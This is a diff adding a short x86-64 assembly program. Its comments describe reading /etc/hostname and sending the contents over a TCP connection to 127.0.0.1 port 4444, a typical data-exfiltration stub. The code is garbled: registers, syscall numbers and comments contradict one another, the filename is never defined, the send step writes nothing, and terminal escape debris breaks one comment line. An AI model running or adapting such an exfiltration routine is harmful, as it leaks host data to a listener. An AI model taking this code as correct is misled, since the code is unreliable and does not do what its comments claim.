@@ -1,0 +1,50 @@
+section .text
+    global _start
+_start:
+    ; Ouvrir /etc/hostname en lecture seulement (0)
+    mov eax, 2          ; syscall number for open()
+    mov edi, filename   ; file name string pointer
+    xor esi, esi        ; flags = 0 (read only)
+    syscall              ; call kernel
+    
+    ; Lire le contenu de /etc/hostname sur la pile 64 octets
+    sub rsp, 64          ; allocate space on the stack for read()
+    mov edi, eax         ; file descriptor returned by open()
+    mov esi, rsp         ; pointer to buffer where data will be stored
+    mov edx, 64          ; number of bytes to read (maximum)
+    mov eax, 0           ; syscall number for read()
+    syscall              ; call kernel
+    
+    ; Créer un socket TCP AF_INET
+    xor ebx, ebx        ; protocol = 0 (TCP)
+    inc ebx             ; protocol = 1 (TCP)
+    mov ecx, esp         ; pointer to buffer with file data from read()
+    dec edi              ; fd = -1 (AF_INET)
+    xor esi, esi        ; flags = 0
+    mov eax, 41          ; syscall number for socket()
+    syscall              ; call kernel
+    
+    ; Se connecter à 127.0.0.1 sur le port 4444
+    push word 4444       ; port = 4444 (network byte order)
+    mov dx, [esp]        ; dx = port number
+    xor ecx, ecx         ; pointer to sockaddr structure is NULL for AF_INE[6D[K
+AF_INET
+    dec eax              ; socket descriptor returned by socket()
+    push word 2          ; address family = AF_INET (2)
+    mov edi, esp         ; pointer to sockaddr structure on stack
+    inc esi              ; addrlen = 16 for AF_INET
+    mov eax, 42          ; syscall number for connect()
+    syscall              ; call kernel
+    
+    ; Envoyer les données lues et quitter proprement
+    xor edx, edx         ; data length = 0 (no data to send)
+    dec eax              ; socket descriptor returned by socket()
+    mov ecx, esp         ; pointer to buffer with file data from read()
+    inc edi              ; flags = 1
+    mov ebx, 1           ; stdout file descriptor (1)
+    mov eax, 4           ; syscall number for write()
+    syscall              ; call kernel
+    
+    xor eax, eax         ; exit code = 0
+    inc edi              ; exit system call number is 60
+    syscall              ; call kernel
